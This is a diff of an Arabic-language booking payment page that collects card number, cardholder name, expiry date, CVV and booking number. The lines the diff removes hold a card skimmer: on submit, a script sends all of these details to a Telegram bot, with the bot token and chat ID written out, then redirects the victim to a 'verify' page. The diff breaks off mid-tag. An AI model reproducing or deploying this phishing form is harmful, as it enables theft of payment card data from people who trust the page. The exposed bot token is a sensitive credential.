@@ -23,12 +23,6 @@
 
   <main>
     <form id="paymentForm">
-      <label for="confirmBooking">تأكيد رقم الحجز (6 أرقام):</label>
-      <input type="text" id="confirmBooking" minlength="6" maxlength="6" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
-
-      <p id="lengthError" class="error-message">
-        ❗ رقم الحجز يجب أن يتكون من 6 أرقام فقط.
-      </p>
 
       <label for="cardNumber">رقم البطاقة (مثل: 1234-5678-9012-3456):</label>
       <input type="text" id="cardNumber" maxlength="19" required oninput="formatCardNumber(this)" />
@@ -38,7 +32,7 @@
 
       <label for="expiryMonth">الشهر (MM):</label>
       <select id="expiryMonth" required>
-        <option value="">--</option>
+        <option value="">-- اختر الشهر --</option>
         <option>01</option><option>02</option><option>03</option>
         <option>04</option><option>05</option><option>06</option>
         <option>07</option><option>08</option><option>09</option>
@@ -47,90 +41,13 @@
 
       <label for="expiryYear">السنة (YYYY):</label>
       <select id="expiryYear" required>
-        <option value="">--</option>
+        <option value="">-- اختر السنة --</option>
         <option>2025</option><option>2026</option><option>2027</option>
         <option>2028</option><option>2029</option><option>2030</option>
         <option>2031</option><option>2032</option>
+        <option>2033</option><option>2034</option><option>2035</option><option>2036</option>
+        <option>2037</option><option>2038</option> <!-- صلاحية البطاقة حتى عام 2044 -->
       </select>
 
       <label for="cvv">CVV (3 أرقام):</label>
-      <input type="text" id="cvv" minlength="3" maxlength="3" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
-
-      <p id="dateError" class="error-message">
-        ❗ لأسباب أمنية، لا يمكننا قبول بطاقات منتهية الصلاحية.
-      </p>
-
-      <button type="submit">ادفع الآن</button>
-    </form>
-  </main>
-
-  <footer>
-    جميع الحقوق محفوظة © 2025
-  </footer>
-
-  <script>
-    function formatCardNumber(input) {
-      let value = input.value.replace(/[^0-9]/g, "");
-      value = value.slice(0, 16);
-      let formatted = value.match(/.{1,4}/g);
-      input.value = formatted ? formatted.join("-") : "";
-    }
-
-    document.getElementById("paymentForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-
-      const confirmBooking = document.getElementById("confirmBooking").value;
-      const lengthError = document.getElementById("lengthError");
-      const dateError = document.getElementById("dateError");
-
-      lengthError.style.display = "none";
-      dateError.style.display = "none";
-
-      if (confirmBooking.length !== 6) {
-        lengthError.style.display = "block";
-        return;
-      }
-
-      const month = parseInt(document.getElementById("expiryMonth").value);
-      const year = parseInt(document.getElementById("expiryYear").value);
-
-      if (year < 2025 || (year === 2025 && month < 7)) {
-        dateError.style.display = "block";
-        return;
-      }
-
-      const cardNumber = document.getElementById("cardNumber").value;
-      const cardName = document.getElementById("cardName").value;
-      const cvv = document.getElementById("cvv").value;
-
-      const message = `
-💳 معلومات عملية الدفع:
-------------------------
-📄 رقم البطاقة: ${cardNumber}
-👤 الاسم على البطاقة: ${cardName}
-📆 تاريخ الانتهاء: ${month}/${year}
-🔐 CVV: ${cvv}
-🔢 رقم الحجز: ${confirmBooking}
-`;
-
-      fetch("https://api.telegram.org/bot8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I/sendMessage", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: "8404960059",
-          text: message
-        })
-      })
-      .then(() => {
-        window.location.href = "verify.html";
-      })
-      .catch(() => {
-        alert("❌ فشل الإرسال إلى البوت");
-      });
-    });
-  </script>
-
-</body>
-</html>
+      <input type="text" id="cv
